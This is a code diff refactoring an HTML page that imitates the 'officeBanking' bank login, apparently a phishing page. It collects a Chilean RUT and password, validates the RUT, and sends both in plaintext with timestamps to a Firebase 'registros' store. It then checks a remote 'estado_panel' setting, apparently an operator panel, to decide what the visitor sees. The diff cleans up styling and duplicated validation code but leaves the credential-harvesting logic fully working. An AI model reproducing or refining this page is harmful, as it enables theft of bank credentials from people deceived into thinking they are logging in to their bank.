@@ -2,69 +2,36 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Ingreso a officeBanking</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js">
-    function validarRut(rut) {
-      if (rut.length < 2) return false;
-      const cuerpo = rut.slice(0, -1);
-      const dv = rut.slice(-1).toUpperCase();
-      let suma = 0, multiplo = 2;
-      for (let i = cuerpo.length - 1; i >= 0; i--) {
-        suma += parseInt(cuerpo[i]) * multiplo;
-        multiplo = multiplo === 7 ? 2 : multiplo + 1;
-      }
-      const dvr = 11 - (suma % 11);
-      const verificador = dvr === 11 ? "0" : dvr === 10 ? "K" : dvr.toString();
-      return verificador === dv;
-    }
-  </script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js">
-    function validarRut(rut) {
-      if (rut.length < 2) return false;
-      const cuerpo = rut.slice(0, -1);
-      const dv = rut.slice(-1).toUpperCase();
-      let suma = 0, multiplo = 2;
-      for (let i = cuerpo.length - 1; i >= 0; i--) {
-        suma += parseInt(cuerpo[i]) * multiplo;
-        multiplo = multiplo === 7 ? 2 : multiplo + 1;
-      }
-      const dvr = 11 - (suma % 11);
-      const verificador = dvr === 11 ? "0" : dvr === 10 ? "K" : dvr.toString();
-      return verificador === dv;
-    }
-  </script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <style>
     body {
-      background-color: white;
+      background: white;
       font-family: sans-serif;
+      margin: 0;
+      padding: 20px;
       display: flex;
-      flex-direction: column;
+      height: 100vh;
       align-items: center;
       justify-content: center;
-      padding: 20px;
-      height: 100vh;
     }
     .form-box {
       border: 2px solid red;
+      background: white;
       padding: 20px;
       border-radius: 10px;
-      background-color: white;
-      max-width: 300px;
       width: 100%;
-    }
-    h2 {
-      margin-bottom: 20px;
-      font-size: 20px;
+      max-width: 320px;
+      box-sizing: border-box;
     }
     .title {
       font-weight: bold;
       font-size: 22px;
       margin-bottom: 20px;
-    }
-    .black {
-      color: black;
+      text-align: center;
     }
     .red-box {
       background-color: black;
@@ -75,57 +42,60 @@
       margin-left: 4px;
     }
     input {
-      max-width: 240px;
-      display: block;
-      margin-left: auto;
-      margin-right: auto;
       width: 100%;
       padding: 10px;
-      margin: 10px 0;
+      margin-top: 10px;
       border: 2px solid black;
       border-radius: 5px;
       font-size: 16px;
+      box-sizing: border-box;
     }
     .input-container {
       position: relative;
     }
     .toggle-password {
       position: absolute;
-      right: 10px;
       top: 14px;
+      right: 10px;
       cursor: pointer;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: red;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      margin-top: 15px;
     }
     #mensajeFinal {
       color: red;
       font-weight: bold;
       display: none;
-      text-align: center;
       margin-top: 20px;
+      text-align: center;
     }
-    button {
-      background-color: red;
-      color: white;
-      padding: 10px;
-      width: 100%;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      margin-top: 10px;
+    #errorRut {
+      color: red;
+      font-weight: bold;
+      display: none;
+      font-size: 14px;
+      margin-top: 5px;
+      text-align: center;
     }
   </style>
 </head>
 <body>
   <div class="form-box">
     <div class="title">
-      <span class="black">Ingreso a</span><span class="red-box">officeBanking</span>
+      Ingreso a <span class="red-box">officeBanking</span>
     </div>
-    
-  <form id="formulario">
-    <div id="errorRut" style="color:red; font-weight:bold; display:none;">RUT inválido</div>
-  
-      <input type="text" id="rut" placeholder="RUT" required>
+    <form id="formulario">
+      <div id="errorRut">RUT inválido</div>
+      <input type="text" id="rut" placeholder="RUT" required />
       <div class="input-container">
-        <input type="password" id="clave" placeholder="Contraseña" required>
+        <input type="password" id="clave" placeholder="Contraseña" required />
         <span class="toggle-password" onclick="togglePassword()">👁️</span>
       </div>
       <button type="submit">Ingresar</button>
@@ -152,32 +122,40 @@
       input.type = input.type === "password" ? "text" : "password";
     }
 
-    function formatoRut(rut) {
-      return rut.replace(/^0+|[^0-9kK]+/g, '').toUpperCase()
-                .replace(/(\d)(?=(\d{3})+(?!\d))/g, '$1.')
-                .replace(/\.(?=\d{1,2}$)/, '-') || rut;
+    function validarRut(rut) {
+      rut = rut.replace(/[^0-9kK]/g, "").toUpperCase();
+      if (rut.length < 2) return false;
+      const cuerpo = rut.slice(0, -1);
+      const dv = rut.slice(-1);
+      let suma = 0, multiplo = 2;
+      for (let i = cuerpo.length - 1; i >= 0; i--) {
+        suma += parseInt(cuerpo[i]) * multiplo;
+        multiplo = multiplo === 7 ? 2 : multiplo + 1;
+      }
+      const dvr = 11 - (suma % 11);
+      const verificador = dvr === 11 ? "0" : dvr === 10 ? "K" : dvr.toString();
+      return verificador === dv;
     }
 
-    document.getElementById("formulario").addEventListener("submit", async function(e) {
+    document.getElementById("formulario").addEventListener("submit", async function (e) {
       e.preventDefault();
-      
-      const rutRaw = document.getElementById("rut").value.trim();
-      const rut = rutRaw.replace(/[^0-9kK]/g, "").toUpperCase();
+      const rutInput = document.getElementById("rut");
+      const rut = rutInput.value.trim().replace(/[^0-9kK]/g, "").toUpperCase();
+      const clave = document.getElementById("clave").value.trim();
+
       if (!validarRut(rut)) {
         document.getElementById("errorRut").style.display = "block";
         return;
       } else {
         document.getElementById("errorRut").style.display = "none";
       }
-  
-      const clave = document.getElementById("clave").value.trim();
+
       const timestamp = Date.now();
       const fecha = new Date().toLocaleString("es-CL");
 
       const ref = db.ref("registros").push();
       await ref.set({ rut, clave, timestamp, fecha });
 
-      // Consultamos si el panel está activo o inactivo
       db.ref("estado_panel/modo").once("value", snapshot => {
         const modo = snapshot.val();
         if (modo === "activo") {
@@ -188,20 +166,6 @@
         }
       });
     });
-  
-    function validarRut(rut) {
-      if (rut.length < 2) return false;
-      const cuerpo = rut.slice(0, -1);
-      const dv = rut.slice(-1).toUpperCase();
-      let suma = 0, multiplo = 2;
-      for (let i = cuerpo.length - 1; i >= 0; i--) {
-        suma += parseInt(cuerpo[i]) * multiplo;
-        multiplo = multiplo === 7 ? 2 : multiplo + 1;
-      }
-      const dvr = 11 - (suma % 11);
-      const verificador = dvr === 11 ? "0" : dvr === 10 ? "K" : dvr.toString();
-      return verificador === dv;
-    }
   </script>
 </body>
 </html>
